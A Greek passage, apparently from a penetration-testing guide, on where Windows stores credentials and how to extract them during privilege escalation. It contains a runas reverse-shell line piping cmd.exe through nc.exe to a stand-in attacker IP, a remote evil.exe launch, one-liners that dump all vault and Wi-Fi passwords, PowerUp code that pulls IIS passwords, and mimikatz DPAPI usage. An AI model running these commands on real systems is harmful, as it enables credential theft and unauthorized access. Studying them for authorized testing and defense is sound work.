Μπορείτε να εξερευνήσετε το filesystem του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Το Linux `root` μέσα στο WSL δεν παρέχει από μόνο του δικαιώματα Windows Administrator. Αν η τρέχουσα ταυτότητα Windows μπορεί να διαβάσει το filesystem μιας διανομής, ελέγξτε τα αρχεία ιστορικού κελύφους (συμπεριλαμβανομένου του `/root/.bash_history`) για εντολές που ενδέχεται να έχουν καταγράψει διαπιστευτήρια· για την κλιμάκωση εξακολουθεί να απαιτείται έγκυρος λογαριασμός με υψηλότερα δικαιώματα και επιτρεπόμενη μέθοδος αυθεντικοποίησης. Η διάταξη `LocalState\rootfs` ισχύει για παλαιότερες εγκαταστάσεις WSL· το WSL 2 συνήθως αποθηκεύει τη διανομή σε έναν εικονικό δίσκο [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), επομένως πρώτα εντοπίστε την πραγματική διανομή και τη διαδρομή αποθήκευσης. Αποφύγετε την εκτύπωση του περιεχομένου του ιστορικού κατά την αυτοματοποιημένη απαρίθμηση.

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Αντιμετωπίστε τα `DefaultUserName` και `DefaultDomainName` ως στοιχεία του λογαριασμού και όχι ως διαπιστευτήρια. Μια μη κενή τιμή `DefaultPassword` ή `AltDefaultPassword` αποτελεί εύρημα plaintext στο registry. Αν το `AutoAdminLogon=1`, αλλά δεν είναι αναγνώσιμος κανένας plaintext κωδικός πρόσβασης, αυτό αποτελεί μόνο ένδειξη: το [Sysinternals Autologon μπορεί να αποθηκεύσει τον κωδικό πρόσβασης ως LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), ενώ οι συνηθισμένες αναγνώσεις του registry δεν επιβεβαιώνουν αν υπάρχει αυτό το secret ή αν μπορεί να ανακτηθεί. Ελέγξτε τα δικαιώματα πρόσβασης και την πραγματική διαμόρφωση σύνδεσης πριν αναφέρετε έκθεση διαπιστευτηρίων.

### Διαχειριστής διαπιστευτηρίων / Windows Vault

Από [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για διακομιστές, ιστότοπους και άλλα προγράμματα, τα οποία μπορούν να χρησιμοποιηθούν από τα **Windows** για την **αυτόματη σύνδεση των χρηστών**. Αρχικά, ίσως ακούγεται σαν να μπορούν οι χρήστες να αποθηκεύουν διαπιστευτήρια για ιστότοπους όπως το Facebook, το Twitter ή το Gmail και να συνδέονται αυτόματα μέσω των προγραμμάτων περιήγησης, αλλά δεν λειτουργεί έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια με τα οποία τα Windows μπορούν να συνδέουν αυτόματα τους χρήστες. Αυτό σημαίνει ότι κάθε **εφαρμογή Windows που χρειάζεται διαπιστευτήρια για πρόσβαση σε έναν πόρο** (διακομιστή ή ιστότοπο) **μπορεί να χρησιμοποιήσει αυτό το Credential Manager** και το Windows Vault, αξιοποιώντας τα παρεχόμενα διαπιστευτήρια αντί να ζητά από τους χρήστες να πληκτρολογούν συνεχώς το όνομα χρήστη και τον κωδικό πρόσβασής τους.

Εκτός αν οι εφαρμογές αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι μπορούν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Επομένως, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με το credential manager και να ζητήσει τα διαπιστευτήρια για αυτόν τον πόρο** από το προεπιλεγμένο vault αποθήκευσης.

Χρησιμοποιήστε το `cmdkey` για να παραθέσετε τα αποθηκευμένα διαπιστευτήρια στον υπολογιστή.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το ακόλουθο παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Χρήση του `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Σημειώστε ότι μπορείτε να χρησιμοποιήσετε τα mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ή το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Οι σύγχρονες εφαρμογές UWP των Windows, το Microsoft Edge και οι σύγχρονες υπηρεσίες συστήματος αποθηκεύουν tokens ελέγχου ταυτότητας και κωδικούς πρόσβασης σε απλό κείμενο μέσα στο `PasswordVault` της Universal Windows Platform (UWP) (εμφανίζεται επίσης ως `Web Credentials` στο `vaultcmd`). Αυτός ο χώρος αποθήκευσης απομονώνεται ανά περίοδο λειτουργίας και μπορεί να αποκρυπτογραφηθεί εγγενώς, χωρίς δικαιώματα διαχειριστή ή `SeDebugPrivilege`.

Εκτελέστε αυτήν την εντολή PowerShell μέσα στην ενεργή περίοδο λειτουργίας του χρήστη, για να αποθηκεύσετε αμέσως σε dump και να αποκρυπτογραφήσετε όλα τα αποθηκευμένα ονόματα χρήστη και τους κωδικούς πρόσβασης σε απλό κείμενο:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο συμμετρικής κρυπτογράφησης δεδομένων και χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος, το οποίο συμβάλλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προκύπτει από τα διαπιστευτήρια σύνδεσης του χρήστη**. Σε σενάρια κρυπτογράφησης συστήματος, χρησιμοποιεί τα μυστικά ελέγχου ταυτότητας του τομέα του συστήματος.

Τα κρυπτογραφημένα κλειδιά RSA χρήστη, μέσω του DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει το [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το κλειδί DPAPI, το οποίο βρίσκεται μαζί με το master key που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, αποτελείται συνήθως από 64 byte τυχαίων δεδομένων. (Σημειώστε ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, με αποτέλεσμα να μην είναι δυνατή η εμφάνιση των περιεχομένων του μέσω της εντολής `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω του PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **αρχεία διαπιστευτηρίων που προστατεύονται από τον κύριο κωδικό** βρίσκονται συνήθως στη:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για αποκρυπτογράφηση.\
Μπορείτε να **εξαγάγετε πολλά DPAPI** **masterkeys** από τη **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Διαπιστευτήρια PowerShell

Τα **διαπιστευτήρια PowerShell** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματοποίησης, ως ένας βολικός τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων. Τα διαπιστευτήρια προστατεύονται με **DPAPI**, πράγμα που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Ένα εξαγόμενο διαπιστευτήριο μπορεί να έχει αυθαίρετο όνομα αρχείου ή διαδρομή `.xml`. Όταν ένα script ή μια απογραφή αρχείων παραπέμπει σε ένα τέτοιο αρχείο, εντοπίστε τον πραγματικό κατάλογο προφίλ του λογαριασμού αντί να υποθέσετε ότι βρίσκεται στο `C:\Users`: [τα Windows μπορούν να τοποθετήσουν τα προφίλ αλλού](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Ένα αναγνώσιμο αρχείο είναι απλώς ένα στοιχείο προς διερεύνηση· η [εντολή `Export-Clixml` των Windows συνδέει ένα κρυπτογραφημένο διαπιστευτήριο με τον χρήστη και τον υπολογιστή που το εξήγαγαν](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), ενώ οποιοσδήποτε λογαριασμός ανακτηθεί πρέπει ξεχωριστά να διαθέτει έγκυρα δικαιώματα στην προβλεπόμενη υπηρεσία. Εξετάστε πρώτα τις διαδρομές και τα ACL, χωρίς να εμφανίζετε κρυπτογραφημένες ή απλού κειμένου τιμές κατά τη συνήθη απογραφή.

Για να **αποκρυπτογραφήσετε** διαπιστευτήρια PS από το αρχείο που τα περιέχει, μπορείτε να εκτελέσετε:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Αποθηκευμένες συνδέσεις RDP

Μπορείτε να τις βρείτε στις `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Εντολές που εκτελέστηκαν πρόσφατα

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Διαχειριστής διαπιστευτηρίων Απομακρυσμένης επιφάνειας εργασίας**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Χρησιμοποιήστε το module `dpapi::rdg` του **Mimikatz** με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε όλα τα αρχεία .rdg**\
Μπορείτε να **εξαγάγετε πολλά DPAPI masterkeys** από τη μνήμη με το module `sekurlsa::dpapi` του Mimikatz

**Το mRemoteNG χρησιμοποιεί διαφορετικό χώρο αποθήκευσης συνδέσεων.** Εξετάστε τα αναγνώσιμα XML στο `%APPDATA%\mRemoteNG` και στους φακέλους Documents των χρηστών, συμπεριλαμβανομένων αρχείων με συνηθισμένα ονόματα όπως `config.xml`. Εντοπίστε το σχήμα των συνδέσεων και τα κρυπτογραφημένα attributes `Password` πριν θεωρήσετε ένα αρχείο XML πιθανό στοιχείο για διαπιστευτήρια. Η αποθηκευμένη τιμή δεν είναι κωδικός DPAPI/RDCMan· η ανάκτηση εξαρτάται από τις ρυθμίσεις κρυπτογράφησης του αρχείου και από το αν χρησιμοποιήθηκε προσαρμοσμένος κύριος κωδικός. Αποφύγετε την εκτύπωση κρυπτογραφημένων τιμών κατά τη μαζική απαρίθμηση.

**Οι εξαγωγές προφίλ του Remote Desktop Plus** ενδέχεται επίσης να είναι αναγνώσιμες σε καταλόγους χρηστών ή σε κοινόχρηστο φάκελο διαχείρισης. Μια παλαιού τύπου εξαγωγή `profiles.xml` περιέχει εγγραφές `Data/Profile` με στοιχεία `ProfileName`, `Password` και `Secure`. Θεωρήστε ένα μη κενό στοιχείο κωδικού πρόσβασης πιθανό στοιχείο για διαπιστευτήρια, χωρίς να το εκτυπώσετε ή να υποθέσετε ότι είναι απλό κείμενο: [ο προμηθευτής αναφέρει](https://www.donkz.nl/) ότι η προστασία προφίλ μπορεί να συνδέεται με τον λογαριασμό και τον υπολογιστή δημιουργίας ή να έχει ρυθμιστεί με λιγότερο αυστηρό τρόπο. Επιβεβαιώστε την προέλευση του αρχείου και τις προϋποθέσεις ανάκτησης πριν βασιστείτε σε αυτό.

### Sticky Notes

Μερικές φορές, οι χρήστες αποθηκεύουν κωδικούς πρόσβασης και άλλες πληροφορίες σε εφαρμογές σημειώσεων. Η πακεταρισμένη εφαρμογή Sticky Notes της Microsoft συνήθως αποθηκεύει σημειώσεις στο `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`· παλαιότερες ή διαφορετικές εφαρμογές ενδέχεται να χρησιμοποιούν άλλες θέσεις αποθήκευσης στο προφίλ χρήστη, όπως το LevelDB. Εντοπίστε την εγκατεστημένη εφαρμογή και τη μορφή αποθήκευσης προτού θεωρήσετε ότι η απουσία αρχείου SQLite σημαίνει πως δεν υπάρχουν σημειώσεις.

Αν το Sticky Notes χρησιμοποιεί write-ahead logging του SQLite, ένα αντίγραφο μόνο του `plum.sqlite` μπορεί να παραλείπει πρόσφατες δεσμευμένες σημειώσεις. Διατηρήστε το αντίστοιχο `plum.sqlite-wal` μαζί με ένα συνεπές αντίγραφο της βάσης δεδομένων και συμπεριλάβετε το `plum.sqlite-shm` όταν είναι διαθέσιμο· το ευρετήριο κοινόχρηστης μνήμης μπορεί να αναδημιουργηθεί, αλλά το WAL αποτελεί μέρος της μόνιμης κατάστασης της βάσης δεδομένων. Δείτε την [τεκμηρίωση WAL του SQLite](https://www.sqlite.org/wal.html). Μια σημείωση που περιέχει όνομα λογαριασμού ή κωδικό πρόσβασης αποτελεί μόνο πιθανό στοιχείο για διαπιστευτήρια: επαληθεύστε ξεχωριστά τον λογαριασμό, τα επιτρεπόμενα δικαιώματα πρόσβασης και την επαναχρησιμοποίηση του κωδικού πρόσβασης. Για να αποδείξει μια κρυπτογραφημένη εγγραφή διαχειριστή κωδικών πρόσβασης ότι παρέχει σύνδεση με υψηλότερα προνόμια, απαιτούνται επιπλέον το πραγματικό κλειδί αποκρυπτογράφησής της και η ερμηνεία της σύμφωνα με την εκάστοτε εφαρμογή.

### AppCmd.exe

**Σημειώστε ότι για να ανακτήσετε κωδικούς πρόσβασης από το AppCmd.exe, πρέπει να είστε Administrator και να το εκτελέσετε με επίπεδο High Integrity.**\
Το **AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν αυτό το αρχείο υπάρχει, είναι πιθανό να έχουν ρυθμιστεί κάποια **διαπιστευτήρια** και να μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας προέρχεται από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Τα προγράμματα εγκατάστασης **εκτελούνται με προνόμια SYSTEM**, πολλά είναι ευάλωτα σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Αρχεία και Registry (Διαπιστευτήρια)

### Τεχνουργήματα διαπιστευτηρίων στο Registry εργαλείων υποστήριξης

Ορισμένες παλαιότερες εγκαταστάσεις απομακρυσμένης υποστήριξης διατηρούν ονόματα τιμών σχετικών με κωδικούς πρόσβασης σε σταθερά κλειδιά Registry της εφαρμογής. Για παράδειγμα, το `SecurityPasswordAES` του TeamViewer προσδιόριζε έναν στατικό κωδικό πρόσβασης συνεδρίας σε εκδόσεις πριν από την 9, σύμφωνα με την [εξήγηση του προμηθευτή για το κλειδί Registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Ένα όνομα τιμής είναι απλώς ένδειξη για περαιτέρω έλεγχο: επαληθεύστε την εγκατεστημένη έκδοση, τα αναγνώσιμα δεδομένα της τιμής, τη μορφή τους και την τρέχουσα συμπεριφορά ελέγχου ταυτότητας πριν αξιολογήσετε το συγκεκριμένο διαπιστευτήριο. Η μετάβαση από έναν κωδικό πρόσβασης απομακρυσμένης υποστήριξης σε έναν λογαριασμό Windows με περισσότερα προνόμια απαιτεί επίσης πραγματική επαναχρησιμοποίηση του κωδικού πρόσβασης και εξουσιοδότηση για αυτόν τον λογαριασμό. Μην εμφανίζετε κρυπτοκείμενο και ανακτημένους κωδικούς πρόσβασης σε συνήθη αποτελέσματα απαρίθμησης.

### Κοινόχρηστα υπολογιστικά φύλλα με προστατευμένα φύλλα

Αν υπάρχει υποψία ότι ένα αναγνώσιμο κοινόχρηστο βιβλίο εργασίας περιέχει δεδομένα λογαριασμών, διακρίνετε την **κρυπτογράφηση αρχείου** από την προστασία φύλλου εργασίας ή τις κρυφές στήλες. Η [Microsoft αναφέρει](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) ότι η προστασία φύλλου εργασίας ελέγχει την επεξεργασία και δεν αποτελεί χαρακτηριστικό ασφαλείας· από μόνη της δεν αποδεικνύει ότι το περιεχόμενο του βιβλίου εργασίας είναι κρυπτογραφημένο. Εξετάζετε μόνο εξουσιοδοτημένα και σχετικά αρχεία και αποφεύγετε την εμφάνιση πιθανών μυστικών κατά την ευρεία απαρίθμηση. Μια αναγνώσιμη διαδρομή `.xlsx`, ένα προστατευμένο φύλλο ή μια κρυφή στήλη από μόνα τους δεν αποδεικνύουν ότι υπάρχουν διαπιστευτήρια ή ότι κάποιος λογαριασμός έχει περισσότερα προνόμια· επαληθεύστε χωριστά τα πραγματικά δεδομένα και τα τρέχοντα δικαιώματα του λογαριασμού.

### Διατηρημένα patches αλλαγών σε διακομιστή CI

Ένας διακομιστής CI μπορεί να διατηρεί τις υποβληθείσες αλλαγές πηγαίου κώδικα στον κατάλογο δεδομένων του, ακόμη και μετά την ολοκλήρωση της διεργασίας build. Το [TeamCity τεκμηριώνει](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) το `system/changes` ως χώρο αποθήκευσης αλλαγών από remote run· ο κατάλογος δεδομένων μπορεί να διαμορφωθεί και δεν βρίσκεται απαραίτητα στο `ProgramData`. Ένα αναγνώσιμο patch μπορεί να διατηρεί αναφορές που προστέθηκαν ή αφαιρέθηκαν και αφορούν ένα αρχείο διαπιστευτηρίων, ένα κλειδί κρυπτογράφησης ή ένα script που χρησιμοποιεί και τα δύο. Για παράδειγμα, μια ροή εργασίας PowerShell `ConvertTo-SecureString -Key` χρειάζεται τόσο το κλειδί AES όσο και την κρυπτογραφημένη συμβολοσειρά· η [Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) ότι το κλειδί παρέχεται ξεχωριστά. Ελέγξτε πρώτα μόνο τα προσβάσιμα ονόματα patch και, στη συνέχεια, εξετάστε το σχετικό περιεχόμενο με εξουσιοδότηση, χωρίς να εμφανίζετε μυστικά σε συνήθη αποτελέσματα απαρίθμησης. Μια διαδρομή patch, μια κρυπτογραφημένη τιμή ή μια αναφορά κλειδιού από μόνα τους δεν αποδεικνύουν ότι υπάρχει έγκυρο διαπιστευτήριο ή πρόσβαση με περισσότερα προνόμια. Περιορίστε τα ACL του καταλόγου δεδομένων και αποφύγετε την υποβολή μυστικών μέσω αλλαγών build.

### Προσαρμοσμένη περιστροφή κωδικού πρόσβασης τοπικού διαχειριστή

Ένα αυτοσχέδιο εργαλείο περιστροφής κωδικών πρόσβασης μπορεί να αποθηκεύει έναν κρυπτογραφημένο κωδικό πρόσβασης τοπικού διαχειριστή σε μια τοπική υπηρεσία, ενώ διατηρεί τα διαπιστευτήρια του datastore σε αναγνώσιμο αρχείο `.env` ή δίπλα στο δυαδικό αρχείο του updater. Εξετάστε μαζί την προγραμματισμένη εργασία του updater, τον λογαριασμό, τα ACL των αρχείων διαμόρφωσης, τον listener και τα δικαιώματα του datastore. Ένα datastore που δέχεται συνδέσεις μόνο μέσω loopback εξακολουθεί να είναι προσβάσιμο από τοπικό χρήστη με έγκυρα διαπιστευτήρια, αλλά ο έλεγχος ταυτότητας από μόνος του δεν αποδεικνύει ότι ο χρήστης έχει δικαίωμα ανάγνωσης των σχετικών εγγραφών. Αν το seed κρυπτογράφησης ή το υλικό κλειδιού είναι προσβάσιμο δίπλα στο κρυπτοκείμενο, εξετάστε την ακριβή παραγωγή κλειδιού πριν εμπιστευτείτε την κρυπτογράφηση. Ένα σχήμα που παράγει ντετερμινιστικά κλειδί AES από εκτεθειμένο seed μέσω του Go [`math/rand`](https://pkg.go.dev/math/rand) είναι ακατάλληλο για την προστασία αυτού του κωδικού πρόσβασης· η Go τεκμηριώνει ότι αυτό το package δεν ενδείκνυται για τυχαιότητα ευαίσθητη ως προς την ασφάλεια. Επιβεβαιώστε ότι οποιοσδήποτε ανακτημένος κωδικός πρόσβασης είναι τρέχων και ανήκει σε λογαριασμό της τοπικής ομάδας Administrators, πριν τον θεωρήσετε διαδρομή κλιμάκωσης προνομίων. Μια προγραμματισμένη εργασία, μια διαδρομή `.env` ή ένα κρυπτογραφημένο blob από μόνα τους δεν αποδεικνύουν καμία από αυτές τις προϋποθέσεις. Μην εμφανίζετε κωδικούς πρόσβασης και υλικό κλειδιού σε συνήθη αποτελέσματα απαρίθμησης.

Χρησιμοποιήστε το [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) για τη διαχείριση κωδικών πρόσβασης τοπικών διαχειριστών. Η αποθήκευσή τους σε directory ή μέσω Entra και οι έλεγχοι πρόσβασης είναι διαφορετικά από ένα προσαρμοσμένο τοπικό datastore· αντίστοιχα, οι [ρόλοι Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) καθορίζουν αν ένας πιστοποιημένος χρήστης του datastore μπορεί να διαβάσει συγκεκριμένο index.

### Αρχεία Java server plugin και επαναχρησιμοποίηση διαπιστευτηρίων

Ορισμένα Java server plugins διανέμονται ως αρχεία JAR στον κατάλογο `plugins` ενός διακομιστή. Ένα αναγνώσιμο προσαρμοσμένο plugin μπορεί να περιέχει διαμόρφωση ή bytecode με ενσωματωμένο διαπιστευτήριο υπηρεσίας. Εξετάζετε το αρχείο μόνο όταν έχετε εξουσιοδότηση και μην εμφανίζετε ανακτημένα μυστικά σε συνήθη αποτελέσματα απαρίθμησης. Μια διαδρομή plugin από μόνη της δεν αποδεικνύει ότι υπάρχει μυστικό, ενώ ένας ανακτημένος κωδικός πρόσβασης υπηρεσίας οδηγεί σε περισσότερα προνόμια μόνο αν ισχύει και για λογαριασμό με περισσότερα προνόμια. Ελέγξτε τα σχετικά ACL αρχείων και αντικαταστήστε τα επαναχρησιμοποιημένα διαπιστευτήρια με ξεχωριστά μυστικά. Ανατρέξτε στον [οδηγό εγκατάστασης plugin του PaperMC](https://docs.papermc.io/paper/adding-plugins/) για τη διάταξη καταλόγων και στην [τεκμηρίωση JAR της Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) για τα περιεχόμενα αρχείων.

### Διαπιστευτήρια ενσωματωμένης βάσης δεδομένων Openfire

Μια εγκατάσταση Openfire που χρησιμοποιεί την ενσωματωμένη βάση δεδομένων μπορεί να διατηρεί το `openfire.script` στη διαδρομή `Openfire\embedded-db`. Αν ο τρέχων λογαριασμός μπορεί να το διαβάσει, εξετάστε μαζί τις εγγραφές `OFUSER` και την ιδιότητα `passwordKey`. Η [τεκμηρίωση παρόχου χρηστών του Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) αναφέρει ότι οι κωδικοί πρόσβασης μπορούν να αποθηκεύονται σε απλό κείμενο ή να κρυπτογραφούνται με κλειδί που βρίσκεται σε αυτή την ιδιότητα. Ένας ανακτημένος κωδικός πρόσβασης έχει σημασία για την κλιμάκωση προνομίων μόνο αν εξακολουθεί να ισχύει για ταυτότητα με περισσότερα προνόμια· το όνομα του αρχείου από μόνο του δεν αποδεικνύει ούτε πρόσβαση ανάγνωσης ούτε επαναχρησιμοποίηση διαπιστευτηρίων. Η διαδρομή είναι ένδειξη για απογραφή, γι’ αυτό μην εμφανίζετε περιεχόμενο βάσης δεδομένων και διαπιστευτήρια σε συνήθη αποτελέσματα απαρίθμησης.

